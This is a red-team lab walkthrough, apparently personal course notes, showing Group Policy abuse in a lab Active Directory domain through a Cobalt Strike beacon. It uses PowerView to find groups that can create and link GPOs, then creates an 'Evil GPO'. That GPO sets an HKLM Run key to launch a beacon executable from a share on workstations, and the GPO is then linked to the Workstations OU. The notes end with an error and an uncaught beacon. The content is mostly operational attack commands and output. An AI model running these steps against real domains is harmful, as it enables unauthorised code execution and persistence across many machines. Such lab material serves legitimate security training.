Group Policy Objects are stored in _CN=Policies,CN=System_ - principals that can create new GPOs in the domain have the "Create groupPolicyContainer objects" privilege over this object.  We can find these with PowerView's `Get-DomainObjectAcl` cmdlet by looking for those that have "CreateChild" rights on the "Group-Policy-Container", and then resolving their SIDs to readable names.

`import powerview.ps1`
```powershell
[12/12 20:22:27] beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
[12/12 20:22:28] [+] host called home, sent: 16 bytes
[12/12 20:22:30] [*] Tasked beacon to import: C:\Tools\PowerSploit\Recon\PowerView.ps1
[12/12 20:22:30] [+] host called home, sent: 143801 bytes
```
`powerpick Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }`
```powershell
[12/12 20:22:48] beacon> powerpick Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }
[12/12 20:22:48] [*] Tasked beacon to run: Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier } (unmanaged)
[12/12 20:22:48] [+] host called home, sent: 138058 bytes
[12/12 20:22:58] [+] received output:
DEV\Developers
```
  This shows that members of the "Developers" group can create new GPOs.


Being able to create a GPO doesn't achieve anything unless it can be linked to an OU.  The ability to link a GPO to an OU is controlled on the OU itself by granting "Write gPLink" privileges.

This is also something we can find with PowerView by first getting all of the domain OUs and piping them into Get-DomainObjectAcl again.  Iterate over each one looking for instances of "WriteProperty" over "GP-Link" .

```powershell
[12/12 20:25:52] beacon> powerpick Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl
[12/12 20:25:52] [+] host called home, sent: 10 bytes
[12/12 20:25:52] [*] Tasked beacon to run: Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl (unmanaged)
[12/12 20:25:52] [+] host called home, sent: 138048 bytes
[12/12 20:26:01] [+] received output:


ObjectDN              : OU=Workstations,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : ReadProperty, WriteProperty
ObjectAceType         : GP-Link
SecurityIdentifier    : S-1-5-21-569305411-121244042-2357301523-1107


[12/12 20:26:04] [+] received output:
```

```powershell
beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
DEV\Developers
```
 This shows that members of the "Developers" group can link GPOs to the "Workstations" OU.

GPOs can be managed from the command line via the PowerShell RSAT modules.  These are an optional install and so usually only found on management workstations.  The `Get-Module` cmdlet will show if they are present.
```powershell
[12/12 20:27:47] beacon> powershell Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
[12/12 20:27:47] [*] Tasked beacon to run: Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
[12/12 20:27:47] [+] host called home, sent: 453 bytes
[12/12 20:27:49] [+] received output:
#< CLIXML

Key                        Value                     
---                        -----                     
Backup-GPO                 Backup-GPO                
Block-GPInheritance        Block-GPInheritance       
Copy-GPO                   Copy-GPO                  
Get-GPInheritance          Get-GPInheritance         
Get-GPO                    Get-GPO                   
Get-GPOReport              Get-GPOReport             
Get-GPPermission           Get-GPPermission          
Get-GPPrefRegistryValue    Get-GPPrefRegistryValue   
Get-GPRegistryValue        Get-GPRegistryValue       
Get-GPResultantSetOfPolicy Get-GPResultantSetOfPolicy
Get-GPStarterGPO           Get-GPStarterGPO          
Import-GPO                 Import-GPO                
Invoke-GPUpdate            Invoke-GPUpdate           
New-GPLink                 New-GPLink                
New-GPO                    New-GPO                   
New-GPStarterGPO           New-GPStarterGPO          
Remove-GPLink              Remove-GPLink             
Remove-GPO                 Remove-GPO                
Remove-GPPrefRegistryValue Remove-GPPrefRegistryValue
Remove-GPRegistryValue     Remove-GPRegistryValue    
Rename-GPO                 Rename-GPO                
Restore-GPO                Restore-GPO               
Set-GPInheritance          Set-GPInheritance         
Set-GPLink                 Set-GPLink                
Set-GPPermission           Set-GPPermission          
Set-GPPrefRegistryValue    Set-GPPrefRegistryValue   
Set-GPRegistryValue        Set-GPRegistryValue       
Get-GPPermissions          Get-GPPermissions         
Set-GPPermissions          Set-GPPermissions        
```
Use the `New-GPO` cmdlet to create and link a new GPO.
```powershell
[12/12 20:33:34] beacon> powerpick New-GPO -Name "Evil GPO"
[12/12 20:33:34] [+] host called home, sent: 10 bytes
[12/12 20:33:34] [*] Tasked beacon to run: New-GPO -Name "Evil GPO" (unmanaged)
[12/12 20:33:34] [+] host called home, sent: 138048 bytes
[12/12 20:33:40] [+] received output:


DisplayName      : Evil GPO
DomainName       : dev.cyberbotic.io
Owner            : DEV\Domain Admins
Id               : 20f769f1-60e6-46e0-b9c5-c8a5cedb8f60
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 12/12/2023 8:33:38 PM
ModificationTime : 12/12/2023 8:33:38 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        : 
```
Some abuses can be implemented directly using RSAT.  For example, the `Set-GPPrefRegistryValue` cmdlet can be used to add an HKLM autorun key to the registry.
```powershell
[12/12 20:35:24] beacon> powerpick Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\dns_x64.exe" -Type ExpandString
[12/12 20:35:24] [+] host called home, sent: 10 bytes
[12/12 20:35:24] [*] Tasked beacon to run: Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\dns_x64.exe" -Type ExpandString (unmanaged)
[12/12 20:35:24] [+] host called home, sent: 138048 bytes
[12/12 20:35:28] [+] received output:


DisplayName      : Evil GPO
DomainName       : dev.cyberbotic.io
Owner            : DEV\Domain Admins
Id               : 20f769f1-60e6-46e0-b9c5-c8a5cedb8f60
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 12/12/2023 8:33:38 PM
ModificationTime : 12/12/2023 8:35:26 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 1, SysVol Version: 1
WmiFilter        : 
```
Next, apply the GPO to the target OU.
```powershell
[12/12 20:36:49] beacon> powerpick Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"
[12/12 20:36:49] [*] Tasked beacon to run: Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" (unmanaged)
[12/12 20:36:49] [+] host called home, sent: 138058 bytes
[12/12 20:36:53] [+] received output:
ERROR: New-GPLink : The GPO named 'Evil GPO' is already linked to a Scope of Management with Path 
ERROR: 'OU=Workstations,DC=dev,DC=cyberbotic,DC=io'.
ERROR: At line:1 char:102
ERROR: + ... Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic, ...
ERROR: +                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : InvalidArgument: (Microsoft.Group...ewGPLinkCommand:NewGPLinkCommand 
ERROR:    ) [New-GPLink], ArgumentException
ERROR:     + FullyQualifiedErrorId : UnableToCreateNewLink,Microsoft.GroupPolicy.Commands.NewGPLinkComman 
ERROR:    d
ERROR:  
```
*error here* 
* also never caught DNS beacon*